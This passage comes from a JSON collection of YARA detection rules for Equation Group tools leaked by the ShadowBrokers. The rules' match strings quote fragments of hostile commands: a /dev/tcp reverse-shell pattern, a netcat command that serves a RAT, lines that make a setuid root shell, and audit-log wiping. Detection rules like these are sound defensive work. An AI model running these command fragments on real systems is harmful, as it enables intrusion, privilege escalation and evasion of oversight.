set","minimum_yara":"1.7","name":"EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k_RID40E0","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"115ad255134fcdaf2710431c348d9560","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_watcher_linux_i386_v_3_3_0_RID3631 : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"invalid option `\" fullword ascii\n      $s8 = \"readdir64\" fullword ascii\n      $s9 = \"89:z89:%r%opw\" fullword wide\n      $s13 = \"Ropopoprstuvwypypop\" fullword wide\n      $s17 = \"Missing argument for `-x'.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )\n}","date":"2017-04-09 16:45:21","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_watcher_linux_i386_v_3_3_0_RID3631","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"e2e9500f11244768d4579bd5848e5b36","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_charm_saver_win2k_v_2_0_0_RID361C : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n      $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 } \n      $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-04-09 16:41:51","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_charm_saver_win2k_v_2_0_0_RID361C","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"337cf049bfed0384e624dffbcdc81eaf","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_cursehappy_win2k_v_6_1_0_RID35DA : APT DEMO EXE FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } \n      $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } \n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them )\n}","date":"2017-04-09 16:30:51","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_cursehappy_win2k_v_6_1_0_RID35DA","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"2340eca6c15849bc662a84918b2019fa","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_morerats_client_Store_RID357A : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 16:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[-] Failed to mmap file: %s\" fullword ascii\n      $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n      $s3 = \"Missing argument for `-x'.\" fullword ascii\n      $s4 = \"[!] Value has size of 0!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and 2 of them )\n}","date":"2017-04-09 16:14:51","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_morerats_client_Store_RID357A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"cf0715bfc58c5e91b662fe37ba1ff895","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6 : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 17:12:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"forceprismheader\" fullword ascii\n      $s2 = \"invalid option `\" fullword ascii\n      $s3 = \"forceprism\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 900KB and all of them )\n}","date":"2017-04-09 17:12:51","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"1d4246458549f7684a0f93cdd1441b12","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_linux_exactchange_RID33CD : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[+] looking for vulnerable socket\" fullword ascii\n      $x2 = \"can't use 32-bit exploit on 64-bit target\" fullword ascii\n      $x3 = \"[+] %s socket ready, exploiting...\" fullword ascii\n      $x4 = \"[!] nothing looks vulnerable, trying everything\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )\n}","date":"2017-04-09 15:03:21","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_linux_exactchange_RID33CD","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"dd1a684c26edaa331ac29731ff5aaaf9","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_x86_linux_exactchange_RID3512 : APT DEMO FILE {\n   meta:\n      description = \"Equation Group hack tool set\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-09 15:57:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"kernel has 4G/4G split, not exploitable\" fullword ascii\n      $x2 = \"[+] kernel stack size is %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and 1 of them )\n}","date":"2017-04-09 15:57:31","description":"Equation Group hack tool set","minimum_yara":"1.7","name":"EquationGroup_x86_linux_exactchange_RID3512","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"78f8e7edc2e1fd1b50ffc548921116b3","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule EquationGroup_emptycriss_RID3116 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file emptycriss\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"./emptycriss <target IP>\" fullword ascii\n      $s2 = \"Cut and paste the following to the telnet prompt:\" fullword ascii\n      $s8 = \"environ define TTYPROMPT abcdef\" fullword ascii\n   condition: \n      ( filesize < 50KB and 1 of them )\n}","date":"2017-04-08 13:07:31","description":"Equation Group hack tool leaked by ShadowBrokers- file emptycriss","minimum_yara":"1.7","name":"EquationGroup_emptycriss_RID3116","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"432be1a50b4db57f3f58c49df26b1d54","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_scripme_RID2FB6 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file scripme\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"running \\\\\\\"tcpdump -n -n\\\\\\\", on the environment variable \\\\$INTERFACE, scripted\" fullword ascii\n      $x2 = \"Cannot read $opetc/scripme.override -- are you root?\" ascii\n      $x3 = \"$ENV{EXPLOIT_SCRIPME}\" ascii\n      $x4 = \"$opetc/scripme.override\" ascii\n   condition: \n      ( filesize < 30KB and 1 of them )\n}","date":"2017-04-08 12:08:51","description":"Equation Group hack tool leaked by ShadowBrokers- file scripme","minimum_yara":"1.7","name":"EquationGroup_scripme_RID2FB6","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"72b6c03c1a4d989e877824ba01d857d1","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_cryptTool_RID3093 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file cryptTool\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"The encryption key is \" fullword ascii\n      $s2 = \"___tempFile2.out\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )\n}","date":"2017-04-08 12:45:41","description":"Equation Group hack tool leaked by ShadowBrokers- file cryptTool","minimum_yara":"1.7","name":"EquationGroup_cryptTool_RID3093","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"21d4db180fdedfbb898763f10a9385d3","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_dumppoppy_RID30B1 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file dumppoppy\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Unless the -c (clobber) option is used, if two RETR commands of the\" fullword ascii\n      $x2 = \"mywarn(\\\"End of $destfile determined by \\\\\\\"^Connection closed by foreign host\\\\\\\"\\\")\" fullword ascii\n      $l1 = \"End of $destfile determined by \\\"^Connection closed by foreign host\" \n   condition: \n      ( filesize < 20KB and 1 of them )\n}","date":"2017-04-08 12:50:41","description":"Equation Group hack tool leaked by ShadowBrokers- file dumppoppy","minimum_yara":"1.7","name":"EquationGroup_dumppoppy_RID30B1","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"52adab9be80a11a52403f199adc81616","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_Auditcleaner_RID3194 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"> /var/log/audit/audit.log; rm -f .\" ascii\n      $x2 = \"Pastables to run on target:\" ascii\n      $x3 = \"cp /var/log/audit/audit.log .tmp\" ascii\n      $l1 = \"Here is the first good cron session from\" fullword ascii\n      $l2 = \"No need to clean LOGIN lines.\" fullword ascii\n   condition: \n      ( filesize < 300KB and 1 of them )\n}","date":"2017-04-08 13:28:31","description":"Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner","minimum_yara":"1.7","name":"EquationGroup_Auditcleaner_RID3194","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"770b54e61e62a638235f93634e396002","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_reverse_shell_RID3236 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:55:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sh >/dev/tcp/\" ascii\n      $s2 = \" <&1 2>&1\" fullword ascii\n   condition: \n      ( filesize < 1KB and all of them )\n}","date":"2017-04-08 13:55:31","description":"Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script","minimum_yara":"1.7","name":"EquationGroup_reverse_shell_RID3236","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"3a571c17b75c12ce6f1d0094f049ddbb","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_tnmunger_RID3033 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file tnmunger\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:29:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TEST: mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n      $s2 = \"mungedport=%6d  pp=%d  unmunged=%6d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 10KB and 1 of them )\n}","date":"2017-04-08 12:29:41","description":"Equation Group hack tool leaked by ShadowBrokers- file tnmunger","minimum_yara":"1.7","name":"EquationGroup_tnmunger_RID3033","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"1a68a3abc1ad77b27d0db60d1072d332","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_ys_ratload_RID30F5 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"echo \\\"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\\\"\" fullword ascii\n      $x2 = \"-x [ port to start mini X server on DEFAULT = 12121 ]\\\"\" fullword ascii\n      $x3 = \"CALLBACK_PORT=32177\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them )\n}","date":"2017-04-08 13:02:01","description":"Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh","minimum_yara":"1.7","name":"EquationGroup_ys_ratload_RID30F5","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"1870dc7e8f54d10fbbdb4fce459736b7","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_eh_1_1_0_RID2F3F : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:49:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s -e -v -i target IP [-c Cert File] [-k Key File]\" fullword ascii\n      $x2 = \"TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=\" ascii\n      $x3 = \"[-l Log File] [-m save MAC time file(s)] [-p Server Port]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 1 of them )\n}","date":"2017-04-08 11:49:01","description":"Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0","minimum_yara":"1.7","name":"EquationGroup_eh_1_1_0_RID2F3F","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"72a1cdb31bf653d236c3174253ae81f4","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_evolvingstrategy_1_0_1_RID354F : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 16:07:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"chown root sh; chmod 4777 sh;\" fullword ascii\n      $s2 = \"cp /bin/sh .;chown root sh;\" fullword ascii\n      $l1 = \"echo clean up when elevated:\" fullword ascii\n      $x1 = \"EXE=$DIR/sbin/ey_vrupdate\" fullword ascii\n   condition: \n      ( filesize < 4KB and 1 of them )\n}","date":"2017-04-08 16:07:41","description":"Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1","minimum_yara":"1.7","name":"EquationGroup_evolvingstrategy_1_0_1_RID354F","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"6898e2c79fbdd39846d9c31437c59c89","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_toast_v3_2_0_RID3116 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Del --- Usage: %s -l file -w wtmp -r user\" fullword ascii\n      $s5 = \"Roasting ->%s<- at ->%d:%d<-\" fullword ascii\n      $s6 = \"rbnoil -Roasting ->\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )\n}","date":"2017-04-08 13:07:31","description":"Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux","minimum_yara":"1.7","name":"EquationGroup_toast_v3_2_0_RID3116","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"0a29d836c2ebeab07b324845b93c522b","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_sshobo_RID2F51 : APT DEMO FILE HKTL T1021 {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file sshobo\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:52:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Requested forwarding of port %d but user is not root.\" fullword ascii\n      $x2 = \"internal error: we do not read, but chan_read_failed for istate\" fullword ascii\n      $x3 = \"~#  - list forwarded connections\" fullword ascii\n      $x4 = \"packet_inject_ignore: block\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 600KB and all of them )\n}","date":"2017-04-08 11:52:01","description":"Equation Group hack tool leaked by ShadowBrokers- file sshobo","minimum_yara":"1.7","name":"EquationGroup_sshobo_RID2F51","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c218f5f5a44066ee45d91e9e793c6a64","score":75,"tags":["APT","DEMO","T1021","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0_RID382D : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 18:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"result = self.send_command(\\\"ls -al %s\\\" % self.options.DIR)\" fullword ascii\n      $x2 = \"cmd += \\\"D=-l%s \\\" % self.options.LISTEN_PORT\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 1 of them )\n}","date":"2017-04-08 18:10:01","description":"Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py","minimum_yara":"1.7","name":"EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0_RID382D","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"c649212bf95d99daee81c68618f50fb9","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_packrat_RID2FA9 : APT DEMO HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file packrat\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:06:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Use this on target to get your RAT:\" fullword ascii\n      $x3 = \"$ratremotename && \" fullword ascii\n      $x5 = \"$command = \\\"$nc$bindto -vv -l -p $port < ${ratremotename}\\\" ;\" fullword ascii\n   condition: \n      ( filesize < 70KB and 1 of them )\n}","date":"2017-04-08 12:06:41","description":"Equation Group hack tool leaked by ShadowBrokers- file packrat","minimum_yara":"1.7","name":"EquationGroup_packrat_RID2FA9","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"1e0e42f02c15446dfda600b4a8d900dc","score":75,"tags":["APT","DEMO","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_telex_RID2EE5 : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file telex\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 11:34:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>\" fullword ascii\n      $x2 = \"target is not vulnerable. exiting\" fullword ascii\n      $s3 = \"Sending final buffer: evil_blocks and shellcode...\" fullword ascii\n      $s4 = \"Timeout waiting for daemon to die.  Exploit probably failed.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )\n}","date":"2017-04-08 11:34:01","description":"Equation Group hack tool leaked by ShadowBrokers- file telex","minimum_yara":"1.7","name":"EquationGroup_telex_RID2EE5","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"7fed1862c0540c8f9e862a9953b1bc81","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_calserver_RID308A : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file calserver\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 12:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"usage: %s <host> <port> e <contents of a local file to be executed on target>\" fullword ascii\n      $x2 = \"Writing your %s to target.\" fullword ascii\n      $x3 = \"(e)xploit, (r)ead, (m)ove and then write, (w)rite\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )\n}","date":"2017-04-08 12:44:11","description":"Equation Group hack tool leaked by ShadowBrokers- file calserver","minimum_yara":"1.7","name":"EquationGroup_calserver_RID308A","reference":"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1","required_modules":[],"rule_hash":"662083f8caf6dc4e63a260d8b5c0aa7e","score":75,"tags":["APT","DEMO","FILE","HKTL"]},{"author":"Florian Roth","content":"rule EquationGroup_porkclient_RID30FE : APT DEMO FILE HKTL {\n   meta:\n      description = \"Equation Group hack tool leaked by ShadowBrokers- file porkclient\"\n      author = \"Florian Roth\"\n      reference = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n      date = \"2017-04-08 13:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"-c COMMAND: shell command string\" fullword ascii\n      $s2 = \"Cannot combine shell command mode with args to do socket reuse\" fullword ascii\n      $s3 = \"-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )\n}","date":"2017-04-08 13:03:31","description":"Equation Group hack tool leaked by ShadowBrokers- file 